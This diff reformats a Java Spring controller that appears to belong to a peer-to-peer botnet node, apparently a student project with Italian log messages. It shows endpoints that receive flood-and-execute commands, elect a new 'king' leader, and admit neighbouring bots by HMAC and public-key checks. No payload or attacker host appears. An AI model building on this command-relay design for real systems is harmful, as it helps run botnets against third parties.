@@ -54,55 +54,53 @@ public class BotController {
 	}
 
 	@RequestMapping(value = "/flood", method = RequestMethod.POST)
-	public Boolean msgFlood(@RequestBody String msg,HttpServletRequest req) {
-		
-		IP ip=new IP(req.getRemoteAddr());
-		System.out.println("Richiesta di Flood ricevuta da "+ip.toString());
-		bhv.floodAndExecute(msg,ip);
+	public Boolean msgFlood(@RequestBody String msg, HttpServletRequest req) {
+
+		IP ip = new IP(req.getRemoteAddr());
+		System.out.println("Richiesta di Flood ricevuta da " + ip.toString());
+		bhv.floodAndExecute(msg, ip);
 		return true;
 	}
 
 	@RequestMapping("/newKing")
 	public Boolean newKing(HttpServletRequest req) {
-		System.out.println("Richiesta di Elezione ricevuta da"+req.getRemoteAddr());
-		if (nServ.isElegible() && (!(engineBot.isCommandandconquerStatus()))) {
+		System.out.println("Richiesta di Elezione ricevuta da" + req.getRemoteAddr());
+		if (bhv.getpServ().getNewKing().equals("") && nServ.isElegible() && (!(engineBot.isCommandandconquerStatus()))) {
 
-//			System.out.println("addr: " + req.getRemoteAddr());
-//			System.out.println("host: " + req.getRemoteHost());
+			// System.out.println("addr: " + req.getRemoteAddr());
+			// System.out.println("host: " + req.getRemoteHost());
 
 			bhv.getPower(req.getRemoteAddr());
 			return true;
 		} else {
-			//System.out.println("not elegible or already elected");
+			// System.out.println("not elegible or already elected");
 			System.out.println("Non elegibile o gia eletto");
 			return false;
 		}
 	}
-	
-	@RequestMapping(value="/myneighbours/welcome",method = RequestMethod.POST)
-	public Pairs<Long, Integer> myNeighbours(@RequestBody String idBot,HttpServletRequest req) {
-		System.out.println("Richiesta challenge dal mio vicino ricevuta da"+req.getRemoteAddr());
+
+	@RequestMapping(value = "/myneighbours/welcome", method = RequestMethod.POST)
+	public Pairs<Long, Integer> myNeighbours(@RequestBody String idBot, HttpServletRequest req) {
+		System.out.println("Richiesta challenge dal mio vicino ricevuta da" + req.getRemoteAddr());
 		Pairs<Long, Integer> response = new Pairs<>();
 		response = bhv.authReqBot(idBot);
 		return response;
-		}
-	
-	
-	@RequestMapping(value="/myneighbours/hmac",method = RequestMethod.POST)
-	public Boolean myNeighboursHmac(@RequestBody ArrayList<Object> objects,HttpServletRequest req) {
-		System.out.println("Richiesta con hmac de ricevuta da"+req.getRemoteAddr());
+	}
+
+	@RequestMapping(value = "/myneighbours/hmac", method = RequestMethod.POST)
+	public Boolean myNeighboursHmac(@RequestBody ArrayList<Object> objects, HttpServletRequest req) {
+		System.out.println("Richiesta con hmac de ricevuta da" + req.getRemoteAddr());
 		Boolean response = false;
-		response =bhv.checkHmacBot(objects);
-		if(response){
-			IP ipbot=new IP(req.getRemoteAddr());
-			PublicKey pubKey=pki.rebuildPuK(objects.get(2).toString());
-			Pairs<IP,PublicKey> bot=new Pairs<IP, PublicKey>(ipbot,pubKey);
+		response = bhv.checkHmacBot(objects);
+		if (response) {
+			IP ipbot = new IP(req.getRemoteAddr());
+			PublicKey pubKey = pki.rebuildPuK(objects.get(2).toString());
+			Pairs<IP, PublicKey> bot = new Pairs<IP, PublicKey>(ipbot, pubKey);
 			nServ.getNeighbours().add(bot);
 		}
-		System.out.println("risposta"+response);
+		System.out.println("risposta" + response);
 		return response;
 	}
-	
 
 	@RequestMapping("/ping")
 	public Boolean ping() {
@@ -134,7 +132,7 @@ public class BotController {
 			System.out.println("Non sono riuscito a firmare il messaggio pre Flood");
 		}
 
-		bhv.floodAndExecute(msg,nServ.getMyIp());
+		bhv.floodAndExecute(msg, nServ.getMyIp());
 		return true;
 	}
 
